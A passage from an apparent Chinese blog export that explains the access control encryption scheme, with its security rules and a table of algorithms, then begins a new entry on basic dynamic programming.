<p>考虑第三条规则，由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">S_i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>不能够写信息给<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msub><mi>R</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;R_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，如果由中间人<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">San</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span>来判断的话，那么<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">San\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>知道的信息就需要包括矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>P</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;P\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>了，因此可以转化为由接收者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msub><mi>R</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;R_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>来验证两者之间能否通信的问题，如果不满足通信要求就忽略掉信息。</p>
<p>而且为了防止叛变的发送者直接将信息广播给所有人，所以中间的消毒过程需要对信息作出一些改变使得输出的结果仍类似于随机化的结果，但是在正确的接收者是可以复现出明文的。</p>
<p><em><strong>后续的实现中，将2与2b视为一条：即任何叛变的接收者的集合（即使与中间者San勾结）也不能够打破不能读的规则；而对于规则3，前提假设为中间者San是不会与叛变的发送者和叛变的接收者进行勾结（因为在二者能够通信的前提下，San无法阻止）。</strong></em></p>
<hr />
<h1 id="ace定义"><a class="markdownIt-Anchor" href="#ace定义"></a> ACE定义</h1>
<h2 id="包含的算法"><a class="markdownIt-Anchor" href="#包含的算法"></a> 包含的算法</h2>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210801170405.png" alt="ACE算法" /></p>
<p>如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">输出</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>t</mi><mi>u</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">Setup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span></span></span></span></td>
<td style="text-align:center">安全参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>k</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;k\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>、方案矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>P</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;P\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
<td style="text-align:center">主密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>m</mi><mi>s</mi><mi>k</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;msk\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>、公开参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>p</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;pp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>（包含明文空间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>M</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;M\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>和密文空间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>C</mi><mo separator="true">,</mo><msup><mi>C</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;C,C^{&#x27;}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.13692em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>）</td>
</tr>
<tr>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mi>e</mi><mi>y</mi><mtext>  </mtext><mi>G</mi><mi>e</mi><mi>n</mi><mi>e</mi><mi>r</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Key\;Generation</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">G</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span></span></span></span></td>
<td style="text-align:center">主密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>m</mi><mi>s</mi><mi>k</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;msk\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，身份<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>i</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，类型<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>t</mi><mtext>  </mtext><mo>∈</mo><mtext>  </mtext><mo stretchy="false">{</mo><mi>s</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">、</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi mathvariant="normal">、</mi><mi>s</mi><mi>a</mi><mi>n</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\;t\;\in\;\{sen、rec、san\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65418em;vertical-align:-0.0391em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mclose">}</span></span></span></span></td>
<td style="text-align:center">密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>k</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;k\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>（加密密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>e</mi><msub><mi>k</mi><mi>i</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;ek_i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，解密密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>d</mi><msub><mi>k</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;dk_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，消毒密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>r</mi><mi>k</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;rk\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><msub><mi>k</mi><mn>0</mn></msub><mtext>  </mtext><mo>=</mo><mtext>  </mtext><mi>d</mi><msub><mi>k</mi><mn>0</mn></msub><mtext>  </mtext><mo>=</mo><mtext>  </mtext><mi>p</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">ek_0\;=\;dk_0\;=\;pp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">d</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
</tr>
<tr>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">Encrypt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span></span></span></span></td>
<td style="text-align:center">加密密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>e</mi><msub><mi>k</mi><mi>i</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;ek_i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，明文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>m</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;m\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
<td style="text-align:center">密文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>c</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;c\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
</tr>
<tr>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>a</mi><mi>n</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>z</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">Sanitizer</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span></td>
<td style="text-align:center">密文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>c</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;c\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，消毒密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>r</mi><mi>k</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;rk\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
<td style="text-align:center">消毒版本密文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msup><mi>c</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;c^{&#x27;}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
</tr>
<tr>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Decryption</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span></span></span></span></td>
<td style="text-align:center">消毒版本密文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msup><mi>c</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;c^{&#x27;}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，解密密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>d</mi><msub><mi>k</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;dk_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">d</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
<td style="text-align:center">明文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msup><mi>m</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;m^{&#x27;}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span></td>
</tr>
</tbody>
</table>
<h2 id="ace要求"><a class="markdownIt-Anchor" href="#ace要求"></a> ACE要求</h2>
<p>…</p>
<br>


	<div class="row">
    <embed src="../../../../../file/ACE.pdf" width="100%" height="550" type="application/pdf">
	</div>



<br>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>算法记录：基础DP</title>
    <url>/2021/11/02/%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95-%E5%9F%BA%E7%A1%80DP/</url>
    <content><![CDATA[<hr />
<div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>这类dp主要是一些状态比较容易表示，转移方程比较好想，问题比较基本常见的。主要包括递推、背包、LIS（最长递增序列），LCS（最长公共子序列）。</p>
</div>
<hr />
